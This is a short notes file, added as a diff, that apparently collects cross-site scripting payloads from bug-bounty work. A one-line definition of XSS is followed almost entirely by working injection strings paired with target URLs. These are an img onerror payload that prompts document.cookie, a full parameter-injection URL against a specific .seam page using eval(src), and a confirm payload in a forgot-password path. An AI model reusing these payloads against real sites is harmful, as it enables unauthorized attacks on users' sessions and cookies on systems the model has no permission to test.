@@ -1,0 +1,20 @@
+Cross-site scripting (XSS) is a type of computer security vulnerability typically found in web applications. XSS attacks enable attackers to inject client-side scripts into web pages viewed by other users.
+
+link- https://example.com/search
+
+payload - XSS Payload - "><img src=x onerror=prompt(document.cookie);>
+
+parameter based xss
+
+link - https://www.abbc.com/view/component/removals/page_partner-list.seam?a=default&level4=3&lang=de&l=default&level1=%3Cimg%20src=x:alert(alt)%20onerror=eval(src)%20alt=xss%3E&level3=removal&cid=57514
+
+Payload- <img src=x:alert(alt) onerror=eval(src) alt=xss>
+
+Forgot password xss-
+
+Link- https://abc.com/forgot-password
+
+Link- https://abc.com/forgot-password/%22-confirm%60K%60-%22
+
+Payload - "-confirmK-"
+
